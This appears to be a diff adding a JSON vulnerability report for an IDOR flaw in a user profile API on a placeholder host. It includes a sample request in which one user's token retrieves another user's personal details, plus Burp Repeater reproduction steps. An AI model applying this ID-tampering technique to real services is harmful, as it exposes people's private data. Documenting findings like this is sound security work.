@@ -1,0 +1,10 @@
+{
+  "vuln_name": "IDOR in User Profile API",
+  "vuln_type": "IDOR / Broken Access Control",
+  "url": "https://target.com/api/user/profile?id=1002",
+  "method": "GET",
+  "request": "GET /api/user/profile?id=1002 HTTP/1.1\nHost: target.com\nAuthorization: Bearer user_1001_token",
+  "response": "HTTP/1.1 200 OK\n{\"id\":1002,\"email\":\"victim@mail.com\",\"phone\":\"9876543210\",\"address\":\"123 Main St\"}",
+  "steps": "1. Login as User 1001\n2. Capture GET /api/user/profile?id=1001\n3. Change id to 1002 in Burp Repeater\n4. Server returns User 1002 full PII",
+  "context": "Affects all registered users, complete PII exposure including phone and address"
+}
